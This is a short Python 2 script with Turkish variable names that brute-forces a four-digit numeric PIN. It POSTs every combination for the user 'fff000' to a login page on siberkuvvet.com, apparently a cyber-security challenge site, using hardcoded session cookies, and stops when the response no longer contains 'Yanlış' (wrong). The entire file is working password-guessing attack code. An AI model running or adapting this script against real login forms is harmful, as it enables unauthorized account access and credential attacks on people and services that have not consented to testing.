#encoding:utf-8
import requests
import itertools
import re
liste=[0,1,2,3,4,5,6,7,8,9]
uzunluk=4
url=('https://demirci.siberkuvvet.com/ye-10f852a6bbd29748eeaa9d32e8aa9c17/')
headerss = {'host': 'demirci.siberkuvvet.com'}
cook={'__cfduid':"dc60ecdbbbb24856ad36f49f7679b23451507046428","_ga":"GA1.2.10431879.1507046431","_gid":"GA1.2.2061164159.1507841075","PHPSESSID":"uqjv07veionnen46q8u4usol30",'_gat':"1"}
ka="fff000"
komb=itertools.product(liste,repeat=uzunluk)
for i in komb:
     sirada=''.join(map(str,i))
     gonderilecek=dict(kullaniciBilgi=ka,parolaBilgi=sirada)
     r=requests.post(url,data=gonderilecek,cookies=cook)
     if len(re.findall("Yanlış",r.content))==0:
         print'Parola Bulundu',sirada
         break
     else:
         print 'Parola Bulunamadi',sirada
	 
	
